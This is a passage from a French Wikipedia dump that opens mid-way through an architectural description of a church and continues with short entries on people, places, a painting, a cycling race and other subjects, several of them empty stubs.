petites proportions du lobe central des trilobes des lancettes et des soufflets. Les meneaux affectent une modénature aigüe et sont munis de bases, comme à la période flamboyante. Les tiers inférieurs des baies du chevet ont été bouchés pour la pose du retable du maître-autel, qui se compose d'une corps central et de deux ailes latérales obliques, et épouse ainsi la forme du chevet.
Base du clocher et collatéraux.
Le collatéral nord du chœur fait directement suite au bas-côté de la nef, et compte trois travées voûtées d'ogives. Les doubleaux et formerets sont en tiers-point, et les nervures des voûtes affectent un profil prismatique aigu, différent de celui observé sur les voûtes du vaisseau central. Les clés de voûte sont armoriées, mais les écussons sont tous vierges : soit les blasons étaient seulement peints et ont été effacés à la Révolution, soit ils ont été bûchés. Les écussons sont portés par deux angelots, ou entourés de quatre arcatures trilobées garnies de crochets. Tout ceci renvoie clairement à la période flamboyante. De même, les réseaux des fenêtres sont eux aussi flamboyants et largement analogues à ceux de l'abside. Les fenêtres latérales, qui prennent appui sur un mur-bahut délimité par un bandeau mouluré, sont à deux lancettes, et affichent le même remplage que les trois baies du chevet. La baie orientale est à trois lancettes à têtes trilobées, qui sont surmontées de deux soufflets dissymétriques obliques, et de deux étroites mouchettes.
Depuis l'est, la base du clocher s'ouvre par une arcade en tiers-point, qui n'est pas moulurée et simplement chanfreinée, et retombe sur des impostes moulurées, sans différence notable avec l'autre arcade donnant sur le vaisseau central. La travée contient une tourelle d'escalier intérieure, ce qui est assez rare. Les églises d'Armancourt, Verberie et Ully-Saint-Georges en offrent des exemples, mais pas à l'intérieur de la base du clocher. Bien que se situant devant la baie du sud, la tourelle ne l'obture pas. La baie est en arc brisé, et largement ébrasée. À l'ouest, l'on note une arcade en tiers-point bouchée, et munie d'une petite porte. La voûte ne possède pas de formerets, et ses ogives affichent un profil chanfreiné sommaire, qui défie la datation. La retombée s'effectue sur des ressauts des piliers. La clé de voûte est un disque arborant une fleur à cinq pétales. Trois trous pour le passage des cordes ont été percés dans les voûtains.
Le collatéral sud se distingue par ses deux premières grandes arcades en cintre surbaissé, qui retombent sur des culs-de-lampe dans le goût de la Renaissance. Dans un même sens, les voûtes des premières travées sont en plein cintre, et le doubleau intermédiaire retombe au sud sur un chapiteau Renaissance identique aux chapiteaux du second ordre du vaisseau central. Ailleurs, les nervures sont pénétrantes, et se fondent dans des piliers cylindriques engagés. Les clés de voûte sont pendantes, comme généralement à l'approche du milieu du , et ornées des mêmes motifs que les chapiteaux du second ordre des travées droites du chœur. Le profil des ogives est le même que dans le vaisseau central, où il n'y a en revanche pas de clés pendantes. La voûte de la première travée est établie sur une croisée d'ogives simple. Dans la seconde travée, la voûte est agrémentée de liernes, comme dans la travée adjacente du vaisseau central. La troisième travée possède une voûte particulière au dessin dissymétrique complexe, qui est basé sur deux losanges superposés disposés diagonalement. La superposition des deux losanges donne un petit losange central délimité par quatre clés, devant lesquelles les ogives s'arrêtent. Un total de quatre liernes relie les autres angles des deux losanges aux deux autres extrémités de la voûte, et quatre clés supplémentaires accentuent les points de convergence. Les fenêtres étroites des deux premières travées sont en plein cintre comme les voûtes, et munies d'un remplage Renaissance standard de deux formes en plein cintre, surmontées d'un oculus entre deux écoinçons ajourés.
En somme, il paraît évident que ces deux travées ont été terminées en dernier lieu, puisque la Renaissance y est plus présente que dans le vaisseau central (où les voûtes sont en arc brisé), alors qu'elle est absente dans le collatéral nord. Nonobstant, la dernière travée doit être plus ancienne, car ses voûtes sont en arc brisé, et les fenêtres présentent un remplage flamboyant à trois lancettes aux têtes trilobées, surmontées de soufflets et mouchettes selon deux variantes, qui n'existent pas ailleurs dans l'église. Dans la baie orientale, le soufflet symétrique dans le sens vertical représente une particularité rare. L'on note encore, dans la dernière travée uniquement, une frise intéressante à la limite des allèges, où un génie nu et des feuilles de vigne alternent avec des animaux, en l’occurrence un chien, une souris, un chat et un oiseau, dont l'on peut imaginer qu'il est chassé par le chat. Il s'impose la comparaison avec les frises de pampres au début de la nef de Méry-sur-Oise, dans le vaisseau central du Mesnil-Amelot, et dans les bas-côtés de Louvres. Une piscine liturgique est ménagée dans le mur méridional. Sa facture flamboyante contraste avec son arc en plein cintre, et la coquille Saint-Jacques qui se dessine en haut de la niche, comme fréquemment à la Renaissance.
Extérieur.
De la nef, l'on ne voit que le mur du sud, qui est soigneusement appareillé en pierre de taille, et ne permet pas de soupçonner que les fenêtres s'inscrivent en réalité dans les grandes arcades prévues pour le bas-côté sud finalement jamais réalisé. Les fenêtres ont déjà été décrites. Le portail en plein cintre s'ouvre sous la fenêtre médiane, dont la hauteur est par conséquent réduite. Le maître d'œuvre n'a pas réunie la fenêtre et le portail sous une archivolte commune, contrairement aux églises de Louvres et Survilliers : le décor sculpté est en fait entièrement absent, et l'architecture est dénuée de caractère. Les trois contreforts sont scandés par un larmier présent sur les trois faces, au niveau des allèges, mais il ne se poursuit pas sur ceux-ci, contrairement à l'usage. Un glacis sommital à gradins couronne les contreforts, ce qui n'est pas non plus conforme à l'esprit de la Renaissance, qui donne la préférence à des chaperons, comme l'on peut du reste en voir autour du chœur. Se soulève la question de l'authenticité de l'élévation méridionale de la nef.
Le clocher est extrêmement sobre, ce qui étonne dans une région qui a vu naître des clochers d'un grand raffinement à la période romane et au début de la période gothique (Auvers-sur-Oise, Champagne-sur-Oise, Nesles-la-Vallée, Santeuil...). Mais les clochers frustes ne sont pas non plus l'exception, comme le montrent les églises du Plessis-Gassot et de Villiers-le-Bel. L'appareil est en moellons irréguliers noyés dans un mortier, la pierre de taille étant réservée aux contreforts et aux pourtours des ouvertures. Chacun des angles est flanqué par deux contreforts orthogonaux, qui se retraitent deux fois par des larmiers présents sur les trois faces (au niveau de la limite des allèges et au niveau des impostes des fenêtres de la nef), et trois fois par des larmiers simples, avant de s'amortir par un glacis formant larmier, au niveau des impostes des baies de l'étage de beffroi. Le rez-de-chaussée présente une arcade bouchée munie d'une petite porte à l'ouest, et une fenêtre en arc brisé au sud, qui est entourée d'un biseau et surmontée d'un bandeau doublement biseauté en forme de sourcil. Le premier étage est aveugle du côté ouest, et percé d'une lancette simple en arc brisé au sud, qui est seulement entourée d'un biseau. Une fenêtre comparable est visible depuis l'intérieur de l'église, du côté nord. L'étage de beffroi est ajouré, sur chaque face, de deux baies plus grandes, qui prennent appui sur un glacis commun, et sont entourées d'un double ressaut chanfreiné. L'on cherchera en vain des colonnettes à chapiteaux, archivoltes décorées et éléments de scansion horizontaux. Comme particularité, un court étage suit à l'étage de beffroi, et présente sur chaque face une petite baie unique, dont celles regardant vers l'ouest et vers l'est accueillent des cadrans d'horloge. Il n'y a pas de corniche. Le toit est une petite flèche en charpente, couverte de tuiles plates.
La hauteur des parties orientales paraît imposante, surtout en regardant depuis l'est, ce qui est en partie dû à l'implantation de l'église en pente, qui explique que les dernières travées et l'abside s'élèvent au-dessus d'un soubassement, identifiable grâce à sa forme en fort glacis au niveau du chevet du vaisseau central. L'appareil en pierre de taille présente de nettes marques d'érosion, et les éléments sculptés sont en partie abîmés. Les trois premières travées du vaisseau central sont terminées par une frise dorique, où des triglyphes alternent avec des rosaces ou patères à ombilic. Cette disposition renvoie clairement à la Renaissance, qui à l'intérieur du vaisseau central, se manifeste uniquement à travers les chapiteaux des hautes-voûtes. D'autres églises des environs, toutes plus tardives, présentent des frises de la Renaissance, généralement plus élaborées : Attainville, Maffliers, Roissy-en-France. Sur la dernière travée droite et l'abside, la frise prend une forme tout à fait inhabituelle, et est constituée de têtes humaines sculptées en ronde-bosse, à raison de quatre pour la travée droite et de trois pour les pans de l'abside. Le haut des bustes est également représenté, mais pas les bras. Cette frise rappelle vaguement les nombreuses têtes saillantes sur les clochers gothiques du Bellay-en-Vexin et de Jouy-le-Comte. Au , elle n'a pas son équivalent dans la région. Les mêmes têtes saillantes se trouvent sous les chaperons des contreforts des premières travées du chœur, où elles sont moins bien conservées. Sous les chaperons des contreforts à l'angle du collatéral sud, l'on trouve des frontons plaqués, qui sont couronnés d'une sorte de balustres, ce qui devrait être l'interprétation Renaissance des clochetons et pinacles plaqués de la période flamboyante. Le décor des contreforts est complété par des socles cubiques prenant appui sur les chaperons, qui servent de supports à des pots à feu, dont la plupart manquent aujourd'hui. Sinon, les contreforts sont scandés par un larmier qui fait le tour du chœur et des collatéraux à la limite des allèges, et un second larmier qui fait le tour du chevet, y compris les murs orientaux des collatéraux. L'on peut voir que les sommets de leurs fenêtres se situent à mi-hauteur des baies de l'abside. Les fenêtres elles-mêmes sont diversement décorées. Les deux baies Renaissance du collatéral sud sont entourées de multiples moulures. Les deux larges baies flamboyantes de la dernière travée du même collatéral sont surmontées d'un bandeau, qui est peuplé de chimères et de petits animaux fantastiques, selon le goût de la période flamboyante. Les baies de l'abside sont surmontées du même bandeau, mais sans les créatures.
Mobilier.
Parmi le mobilier de l'église, un seul élément est classé monument historique au titre objet, à savoir une statue de saint Sébastien. Elle est en bois, et date du . Le classement remonte à 1965. Deux autres statues en bois de la même époque sont abritées dans les niches des ailes latérales du retable majeur, et représentent saint Sulpice (à gauche) et la Vierge Marie (sans l'Enfant Jésus, à droite). Toujours dans le domaine de la sculpture, l'on peut citer un aigle-lutrin du , dont l'on suppose qu'il provient de l'abbaye Notre-Dame-du-Va, jadis située sur la même paroisse.
L'élément le plus impressionnant du mobilier est sans doute le retable majeur dans le style baroque, qui date du début du , et est représentatif du courant spirituel et artistique de la Contre-Réforme dans la région. Il est entièrement réalisé en pierre. Le corps central est cantonné de deux colonnes ioniques, qui reposent sur de hauts stylobates, et portent des sections d'entablement. Une fleur de lys se profile devant la métope, et la double corniche présente une superposition d'un rang de denticules et d'un rang de corbeaux. Les deux sections d'entablement sont surmontées d'un fronton en arc de cercle brisé, qui reprend l’ordonnancement de la double corniche, avec en plus deux enroulements au sommet, et une frise de rinceaux sur la métope. Ce genre de péristyle plaqué sert d'encadrement au tableau de retable, qui est peint à l'huile sur toile représentant le Christ en croix. Les deux ailes latérales sont assorties au corps central, mais elles sont cantonnées de pilastres ioniques au lieu de colonnes. Le tympan cintré du tableau épouse la forme du fronton du retable. — Une niche cintrée entourée d'un riche décor de guirlandes et chutes de fleurs est ménagée dans chacune des deux ailes latérales. La demi-voûte est agrémentée d'une coquille Saint-Jacques, et en bas, la console recevant la statue est revêtue de feuilles d'acanthe. Les soubassements des ailes latérales arborent des bas-reliefs en marbre blanc, qui représentent la résurrection des morts (à gauche) et la Mise au tombeau (à droite). Le tabernacle est également remarquable. Flanqué de deux ailerons, il est orné de têtes de chérubins et de végétaux, et une gloire au-dessus de l'Agnus Dei allongé sur le Livre aux sept sceaux se dessine sur la porte. Sans doute un peu plus ancien que le retable est la piscine liturgique, qui est prise dans l'épaisseur du pilier au sud de l'abside. La demi-voûte est revêtue d'une coquille Saint-Jacques. La niche est flanquée de pilastres corinthiens, dont l'un est garni de rinceaux, et deux angelots portant un cœur se profilent au milieu des rinceaux de la métope. Il reste à mentionner le retable au chevet du collatéral nord, qui est une déclinaison à échelle réduite du retable du maître-autel, sans les colonnes du corps central, et sans tableau.

</doc>
<doc id="8978438" url="https://fr.wikipedia.org/wiki?curid=8978438" title="Jairo Martinez">
Jairo Martinez



</doc>
<doc id="8978439" url="https://fr.wikipedia.org/wiki?curid=8978439" title="Étoile de type précoce">
Étoile de type précoce

Une étoile de type précoce (calque de l'anglais ") est une étoile de type spectral O, B, A ou F0 à F5, dont la température de surface est supérieure à celle du Soleil.

</doc>
<doc id="8978445" url="https://fr.wikipedia.org/wiki?curid=8978445" title="Tardif (type spectral)">
Tardif (type spectral)



</doc>
<doc id="8978446" url="https://fr.wikipedia.org/wiki?curid=8978446" title="Précoce (type spectral)">
Précoce (type spectral)



</doc>
<doc id="8978449" url="https://fr.wikipedia.org/wiki?curid=8978449" title="Markus Oestreich">
Markus Oestreich

Markus Oestreich, né le à Fulda, est un pilote automobile allemand sur circuits en voitures de tourisme, monoplaces et camions.
Biographie.
Il commence la compétition en 1985, en Formule Ford allemande (classé ), ainsi qu'en DTM sur BMW 635 CSi et en Championnat d'Allemagne de Formule 3 sur Martini MK45-Volkswagen (se produisant ultérieurement au niveau continental dans la discipline). Il trouve alors le temps de se classer des 24 Heures de Spa, avec Dieter Quester et Johnny Cecotto sur la 635 CSi.
Il gagne les 24 Heures du Nürburgring en 1986 avec ses compatriotes Winfried Vogt et Otto Rensing sur BMW 325i du team "Linder Rennsport" (récidivant dans la catégorie A7 en 2002 sur Porsche 996 GT3). Il termine l'année du Championnat d'Europe FIA des voitures de tourisme avec la voiture.
Après avoir disputé le premier Championnat du monde des voitures de tourisme en 1987 (, avec des places de dauphin à Donington et à Nogaro) et finit du championnat d'Europe des voitures de tourisme en 1988 sur BMW M3 avec Zakspeed (5 podiums), il remporte en 1990 les 24 Heures de Spa avec Cecotto et Fabien Giroix sur M3, après s'être produit régulièrement en DTM durant deux saisons pour "l'Opel Team Irmscher". 
En 1994, il dispute encore régulièrement la première Coupe Tourisme D1 ONS de l'ADAC (la "Super Tourenwagen Cup") sur Ford Mondeo Ghia (), ainsi qu'en 2002 les Series allemandes de Tourisme.
Il s'est lancé entretemps dans l'aventure poids lourds européenne en 1992, tout en effectuant encore quelques apparitions sporadiques en endurance (notamment aux 24 Heures de Daytona 1997).
Vice-champion d'Europe sur Mercedes-Benz dès 1993 en Classe C, de la Catégorie "Super-Race-Trucks" en 1995, 1997 et 1998 avec la marque, vice-champion continental en 2000 avec un modèle M-B Atego Renntruck puis en 2003 avec un PAM-MAN 03, il remporte enfin le Championnat d'Europe de courses de camions en 2004, sur un Volkswagen Titan (catégorie "Super-Race-Trucks"), terminant encore vice-champion continental en 2005 avec le Titan et champion d'Europe par équipe en 2010 (avec alors son équipier -champion d'Europe individuel en 2007- le suisse Markus Bösiger, pour le "MKR Technology" team sur un Renault Premium). Il comptabilise désormais individuellement un titre et cinq places de dauphin, et a intégré l'équipe Lutz Bernau MAN en 2013 au côté de l'espagnol Antonio Albacète, formant ainsi de loin la paire la plus expérimentée du championnat.

</doc>
<doc id="8978450" url="https://fr.wikipedia.org/wiki?curid=8978450" title="Grasse matinée">
Grasse matinée

« Grasse matinée » est une expression signifiant une matinée qui se prolonge au lit après l’heure habituelle. 
Étymologie.
Cette expression se retrouve dès le . Le médecin Laurent Joubert explique l'expression "dormir la grasse matinee" par l'idée d'alors que dormir tard "engraisse &amp; fait l'embonpoint."
Toutefois, au , on disait déjà "dormir la grasse matinée". L’adjectif "gras" est issu du latin "crassus" qui signifie "épais". "Faire la grasse matinée" revient donc à "rester longtemps dans l’épaisseur du sommeil". Mais cela évoque également la paresse et le côté "moelleux" du sommeil.
Études.
Selon une étude publiée en 2011, rejointe également par un article publié sur "Wired" se fondant sur plusieurs études scientifiques, faire la grasse matinée serait une source de créativité intellectuelle et artistique du fait d'une augmentation de la capacité humaine à gérer les problèmes de manière originale. Annie Murphy Paul du "" explique que .
Plusieurs études publiées au début du révèlent que les grasses matinées du week-end ne compensent pas le manque de sommeil accumulé pendant la semaine et suggèrent qu'elles seraient néfastes sur la santé (obésité, diabète, syndrome métabolique, maladies cardiaques, troubles de l'humeur, troubles cognitifs, troubles du sommeil, etc.), effets dus au décalage de l'horloge biologique circadienne.
Poésie.
Dans son poème "La grasse matinée", Jacques Prévert développe l'expression, en vers libres, pour dénoncer les inégalités sociales. Le texte, publié dans le recueil "Paroles" est également mis en musique par Joseph Kosma et interprété par Marianne Oswald.

</doc>
<doc id="8978454" url="https://fr.wikipedia.org/wiki?curid=8978454" title="Jeune Fille des monts Sabins">
Jeune Fille des monts Sabins

Jeune Fille des monts Sabins (en allemand, "Mädchen aus den Sabiner Bergen") est une peinture à l'huile sur toile de Franz Xaver Winterhalter datant de 1832-1836. Récupérée des spoliations nazies, elle est prêtée et exposée au musée des beaux-arts de Montréal depuis 2009.
Histoire.
Ce tableau appartint au galeriste Max Stern. En 1937, une vente forcée de sa collection (400 tableaux et objets d'art) fut organisée à Dusseldorf (cf. Spoliation des Juifs). La "Jeune Fille des monts Sabins" y fut achetée par Morsey Pickard.
En 2005, la fille de ce dernier tenta de vendre le tableau mais les légataires universels de Max Stern (l'université Concordia, l'université McGill de Montréal et l'université hébraïque de Jérusalem), prévenus à temps, firent obstacle à la négociation. Le juge Lisi, de la cour du district de Rhode Island (USA), ordonna un transfert de propriété aux universités précitées, considérant que l'achat de 1937 était assimilable à un vol.
Prêté au Musée des beaux-arts de Montréal à partir du , le tableau y est exposé depuis.

</doc>
<doc id="8978456" url="https://fr.wikipedia.org/wiki?curid=8978456" title="Antonio Molina (homonymie)">
Antonio Molina (homonymie)



</doc>
<doc id="8978458" url="https://fr.wikipedia.org/wiki?curid=8978458" title="Antonio Ávila">
Antonio Ávila

Antonio Ávila Bullejos, né le à Maracena, dans la province de Grenade en Espagne, et mort le ), est un artiste photographe espagnol.
Biographie.
Antonio Avila a passé son enfance et adolescence en France à Bordeaux, où il obtient son Baccalauréat en 1971. C´est là qu’il s’imprègne de la culture de ce pays, en écoutant Jacques Brel, Léo Ferré et découvre la peinture, l´une de ses premières passions (Giotto, Piero della Francesca, Boticelli, Léonard de Vinci, Dürer, Rembrandt…). À son retour en Espagne en 1978 il obtient une bourse “Serem” pour étudier la photographie au “Photocentro” à Madrid et ensuite il fait un cours d´Arts Graphiques à Atarfe (Grenade).
Œuvres.
Collages et photomontages.
Parmi ses œuvres plus importantes se trouvent les séries de collages "Le Douanier", "L’Alhambra", "Domaine public" ainsi que la série de photomontages "Objets". 
L´artiste recourt parfois à des matériaux étrangers à ses habitudes, mais nécessaires pour créer “un nouveau style de formes”, car comme dit Alexandre Archipenko, “son usage est un résultat et non l’objectif”. Antonio Avila utilise très peu d´éléments extrapictoraux, ses collages sont une synthèse parfaite de styles et de cultures où il n´existe pas d´abîme: d'Uccello à Rousseau, de Dürer à Duchamp, sans plus de vertige que la passion créatrice, ni d´autre argument dialectique que sa vision de l´absolu, de l´Art comme un tout.
Il réalise également des œuvres à caractère expérimental, utilisant des matériaux divers (bouteilles, sable, fer à repasser…) qui auront écho dans sa série “Objets”, clairement influencée par ce splendide dadaïste que fut Man Ray et ses Rayographs. L´une des idées fixes d´Antonio était de créer avec du sable. De cette obsession est né son scénario “Écrit sous le sable”. C´est ainsi que son art, fait d’une lente gestation, aboutira aux deux séries de collages "Domaine Public" et "L´Alhambra".
Ainsi en se servant de tableaux, il crée le miracle, à savoir que si dans une forêt de Henri Rousseau apparait la célèbre «Chocolatière» de Duchamp, avec des personnages de Dürer sans que l’on ne se sente choqué, quel est le secret? Là, plus de trace de Rousseau, ni de Duchamp, ni de Dürer…… et c´est ainsi que le spectateur de l´œuvre assiste au prodige: Antonio Avila invente un monde nouveau avec ces trois artistes différents et ce monde a sa propre vie. Une vertu presque magique qui fait que le collage n’est plus un travail manuel avec plus ou moins de mérite (considéré, comme la photographie, le parent pauvre de la peinture) pour se transformer en un complexe message polyphonique. La manière de créer est toute une vision ou raison poétique de laquelle il se sert dans tous les moyens qui sont à sa portée, où l´artiste réuni toutes les tendances antérieurement énumérées, sans mépriser aucune d´elles. Selon Antonio Avila le collage pourrait devenir le moyen idéal pour relier différents peintres, époques, styles… Il est le moyen de passer de l´art local à l´universel sans que le spectateur éprouve aucune sensation de refus. Chaque élément est justifié, il n´y a plus lieu pour l´incohérence. Son œuvre renferme la précision, la technique, la main d´un orfèvre, mais aussi ce je ne sais quoi que Bousoño nomme «le mystère de l´inspiration». Ce souffle irraisonnable, sans crainte, qu´Antonio Avila a bu des Surréalisme comme d´une eau précieuse et qui donne à toute sa création une très grande puissance.
Man Ray, John Heartfield ou Roland sont des noms d´où prend forme son obsession pour l´image, la photographie, le photomontage et le collage. À cela il faut ajouter ses scénarios de films où le visuel est un nouvel élément enrichissant, qui sera la parole écrite. Cette chance d´avoir une expression artistique si vaste ne peut pas être posthume. Nous serons complices d´un même sortilège adressé non à l´œil mais à la sensibilité. Dans la série de "L´Alhambra" le verbe se transforme en image, tout en continuant son expérimentation avec la photographie et le collage, son univers imaginaire s´agrandit jusqu'à atteindre la vision de l´art dans toute sa totalité.
En même temps l’auteur a participé à diverses publications spécialisées comme « Nueva Lente » et a dessiné des affiches et des programmes pour le Ciné-Club Universitaire de Grenade.
Scénarios de films.
Comme scénariste il a écrit de 1975 à 1984 les scénarios suivants : "Les Amants Tristes", "Les Invités du Bois", "Cymbalan", "Les Langues d´Esope", "Écrit sous le sable", "Il était une fois" et "L´Alhambra". 
Dans son scénario de "L´Alhambra" défilent des personnages qui appartiennent au monde intérieur de l´Artiste et où il montre sa dichotomie, la terrible contradiction d´Antonio : d´un côté Sébastian Navia qui est lui “le poète mystique” face à un Tarcisio qui fait des appels constants à sa réalité intérieure.
Il a mis en scène un court métrage inédit "Sébastian Navia". Navia vie dans un état d´harmonie perpétuel avec le son (bruit) de l´eau, dans cet endroit magique de L'Alhambra et des jardins du Généralife.
Poésie.
Il a écrit de nombreux poèmes, quelques-uns sont recueillis dans le livre "Narciso ou le mouvement perpétuel: recueil de poèmes et collages".
Expositions.
Individuelles.
1976 – “Domaine Public et Photomontages “. Galerie d´Art Gelabert (Grenade).

</doc>
<doc id="8978459" url="https://fr.wikipedia.org/wiki?curid=8978459" title="Arrondissement de Sarrebourg-Château-Salins">
Arrondissement de Sarrebourg-Château-Salins

L'arrondissement de Sarrebourg-Château-Salins est une division administrative française du département de la Moselle depuis le . 
Il est issu de la fusion des arrondissements de Sarrebourg et de Château-Salins.
Histoire.
Le , les arrondissements de Sarrebourg et de Château-Salins ont été jumelés dans le but de les fusionner ensuite, chose qui fut faite le .
La commune de Sarrebourg étant le chef-lieu de cet arrondissement, la sous-préfecture de Château-Salins a été transformée en Maison de l’État.
Composition.
L'arrondissement se compose de 230 communes au , réparties dans 3 cantons : Le Saulnois (partiel), Sarrebourg et Phalsbourg.
Découpage communal depuis 2015.
Depuis 2015, le nombre de communes des arrondissements varie chaque année soit du fait du redécoupage cantonal de 2014 qui a conduit à l'ajustement de périmètres de certains arrondissements, soit à la suite de la création de communes nouvelles. Le nombre de communes de l'arrondissement de Sarrebourg-Château-Salins est ainsi de 102 en 2015 et 230 en 2016.
Au , l'arrondissement groupe les suivantes :

</doc>
<doc id="8978462" url="https://fr.wikipedia.org/wiki?curid=8978462" title="Hôpital de la Charité">
Hôpital de la Charité



</doc>
<doc id="8978465" url="https://fr.wikipedia.org/wiki?curid=8978465" title="Auguste d'Orville">
Auguste d'Orville

Pierre Auguste d'Orville ou Peter August d'Orville est un problémiste d'échecs allemand né le à Saint-Pétersbourg et mort le à Ratisbonne. Il était le chef de file de la vieille école du problème d'échecs (avant l'apparition du problème indien) et un pionnier de l'approche artistique dans la composition des problèmes.
Biographie.
Né en Russie de parents allemands, Auguste d'Orville grandit à Saint-Pétersbourg. Sa famille émigra en Allemagne lorsque son père prit la direction d'une petite entreprise de tissus à Offenbach-sur-le-Main. Auguste d'Orville représenta l'affaire de son père à Anvers de 1836 à 1842. Il vécut ses dernières années à Ratisbonne en Allemagne.
Compositeur de problèmes d'échecs.
D'Orville composa la plupart de ses problèmes quand il vécut à Anvers (de 1836 à 1842). Il fut un des premiers problémistes à travailler la simplicité et l'harmonie dans ses compositions. Ses problèmes ne comportaient que les pièces nécessaires à la réalisation d'une idée artistique. Selon Alphonse Goetz, il fut des inventeurs du problème orthodoxe en deux coups.
Il publia en 1842, un recueil de problèmes : "Problèmes d'échecs composés et dédiés aux amateurs de ce jeu" qui contient 250 de ses compositions.

</doc>
<doc id="8978467" url="https://fr.wikipedia.org/wiki?curid=8978467" title="Pierre Auguste d'Orville">
Pierre Auguste d'Orville



</doc>
<doc id="8978471" url="https://fr.wikipedia.org/wiki?curid=8978471" title="Frank Peter Belinda">
Frank Peter Belinda

Frank Peter Belinda, nom de plume de Jacques Pierroux, né le à Grivegnée, quartier de Liège, en Belgique, et mort le , est un écrivain belge, auteur de roman policier, de roman d'espionnage et de science-fiction.
Biographie.
En 1952, il publie son premier roman, "C'est à la fin qu'on tue, ma belle", un roman policier mettant en scène un détective privé new-yorkais. La même année, il crée le personnage de John Kallum, un espion héros de vingt-quatre romans parus dans la collection « La Loupe » et de onze romans illustrés publiés dans un magazine dédié "Kallum magazine".
Michel Lebrun définit l'œuvre de Belinda comme .

</doc>
<doc id="8978473" url="https://fr.wikipedia.org/wiki?curid=8978473" title="Howard Fergusson">
Howard Fergusson



</doc>
<doc id="8978476" url="https://fr.wikipedia.org/wiki?curid=8978476" title="Jenny Rose">
Jenny Rose

Jenny Rose née en 1970 est une triathlète professionnel néo-zélandaise, vainqueur de la coupe du monde en 1994 et du championnat du monde de triathlon longue distance en 1995.
Biographie.
Jenny Rose remporte la coupe du monde 1994 en gagnant trois étapes et en accédant à six podiums au total. Elle remporte l’année suivante le championnat du monde longue distance. En 2013, elle sort de sa retraite sportive, pour préparer à l'approche de ses cinquante ans, sa participation à un triathlon hors norme, le Swissman Xtreme Triathlon.
Palmarès.
Le tableau présente les résultats les plus significatifs (podium) obtenus sur le circuit international de triathlon depuis 1993.

</doc>
<doc id="8978479" url="https://fr.wikipedia.org/wiki?curid=8978479" title="Championnats d'Europe des régions de karaté 2003">
Championnats d'Europe des régions de karaté 2003



</doc>
<doc id="8978481" url="https://fr.wikipedia.org/wiki?curid=8978481" title="Arrondissement de Sarrebourg-Chateau-Salins">
Arrondissement de Sarrebourg-Chateau-Salins



</doc>
<doc id="8978482" url="https://fr.wikipedia.org/wiki?curid=8978482" title="Championnats d'Europe des régions de karaté 2004">
Championnats d'Europe des régions de karaté 2004



</doc>
<doc id="8978483" url="https://fr.wikipedia.org/wiki?curid=8978483" title="Essor breton">
Essor breton

L' Essor breton est une course cycliste créée en 1959 et disputée tous les ans au mois de mai. Se déroulant sur quatre jours, elle comprend cinq étapes dont un contre-la-montre par équipes. Il s'agit de la plus ancienne course par étapes du calendrier amateur français. Non disputée en 1972, elle reprend l'année suivante sous le nom de l'Essor finistérien avant de reprendre son appellation actuelle en 1974. La course fait partie du calendrier national de la Fédération française de cyclisme.
L'édition 2020 est annulée en raison de la pandémie de Covid-19. C'est également le cas en 2021.

</doc>
<doc id="8978485" url="https://fr.wikipedia.org/wiki?curid=8978485" title="Hans Hofer">
Hans Hofer

Hans Hofer, pseudonyme de Hanuš Schulhof, né à Prague (Autriche-Hongrie) le et mort à Rostock (Allemagne de l'Est) le , est un artiste de cabaret, humoriste et acteur tchéco-autrichien.
Biographie.
Hans Hofer est le fils d'un comédien réputé de Prague. En 1924, il obtient un contrat à Vienne, mais retourne à Prague après l'annexion de l'Autriche par le Troisième Reich. Il travaille dans sa ville natale jusqu'en 1941 dans le « cabaret juif ». À la fin du mois de , son couple est déporté au ghetto de Theresienstadt où il fonde son propre cabaret, le Hofer-Kabarett. À l'automne de la même année, il apparaît dans le court métrage d'Irena Dodalová tourné dans le camp, "Theresienstadt 1942". Il est assistant-réalisateur de Kurt Gerron pour "Theresienstadt", le film de propagande nazie. Hans Hofer est ensuite transféré pour deux semaines au camp de concentration d'Auschwitz à la fin , puis déplacé à celui de Dachau. Après la libération des camps en , il travaille dans divers théâtres à Prague, puis, en 1960, il est membre du ().

</doc>
<doc id="8978486" url="https://fr.wikipedia.org/wiki?curid=8978486" title="Arrondissement de Sarrebourg/Château-Salins">
Arrondissement de Sarrebourg/Château-Salins



</doc>
<doc id="8978488" url="https://fr.wikipedia.org/wiki?curid=8978488" title="Tadeusz Trojanowski">
Tadeusz Trojanowski

Tadeusz Hipolit Trojanowski, né le à Straszów et mort le à Varsovie, est un lutteur libre polonais.
Carrière.
Il participe aux Jeux olympiques de 1960 à Rome où il obtient une médaille de bronze en catégorie poids coqs. Il dispute aussi les Championnats du monde de lutte en 1955 et en 1961, terminant respectivement aux sixième et cinquième places.

</doc>
<doc id="8978491" url="https://fr.wikipedia.org/wiki?curid=8978491" title="Straszów">
Straszów

En Pologne, Straszów peut désigner :

</doc>
<doc id="8978492" url="https://fr.wikipedia.org/wiki?curid=8978492" title="Spixhe">
Spixhe

Spixhe est un hameau de la commune belge de Theux située en Région wallonne dans la province de Liège.
Avant la fusion des communes de 1977, le hameau faisait déjà partie de la commune de Theux.
Situation.
Ce hameau est située au sud de l'agglomération de Theux en direction de Spa. Il se situe au confluent du ruisseau de Targnon et du Wayai qui se jette quelques centaines de mètres plus loin dans la Hoëgne. 
Spixhe se concentre sur les rives du Wayai tandis que Staneux est situé plus haut sur le versant oriental de cette rivière à l'orée du bois de Staneux.

</doc>
<doc id="8978493" url="https://fr.wikipedia.org/wiki?curid=8978493" title="Straszow">
Straszow



</doc>
<doc id="8978494" url="https://fr.wikipedia.org/wiki?curid=8978494" title="Frankie P. Belinda">
Frankie P. Belinda



</doc>
<doc id="8978497" url="https://fr.wikipedia.org/wiki?curid=8978497" title="Ella l'éléphant">
Ella l'éléphant

Ella l'éléphant (") est une série télévisée d'animation américaine-canadienne en 52 segments de 11 minutes, produits par Atomic Cartoons, Cookie Jar Entertainment, et Disney Junior Original Production et diffusée initialement entre le et le sur Disney Junior aux États-Unis.
Doublée au Québec, la série a été diffusée à partir du à Télé-Québec, et en France, elle a été diffusée sur Tiji.

</doc>
<doc id="8978499" url="https://fr.wikipedia.org/wiki?curid=8978499" title="Straszów (Sainte-Croix)">
Straszów (Sainte-Croix)

Straszów est un village de la voïvodie de Sainte-Croix et du powiat de Kielce. Il fait partie de la gmina de Mniów.

</doc>
<doc id="8978500" url="https://fr.wikipedia.org/wiki?curid=8978500" title="Charlie Fancutt">
Charlie Fancutt

Charles Fancutt est un joueur australien de tennis huitième de finaliste de l'Open d'Australie 1982.
Carrière.
1/8 de finaliste de l'Open d'Australie 1982, il échoue face à Johan Kriek.
Finaliste au Challenger de Nagoya en 1981 et vainqueur en double en 1983 au Challenger de Lee-on-the-Solent.
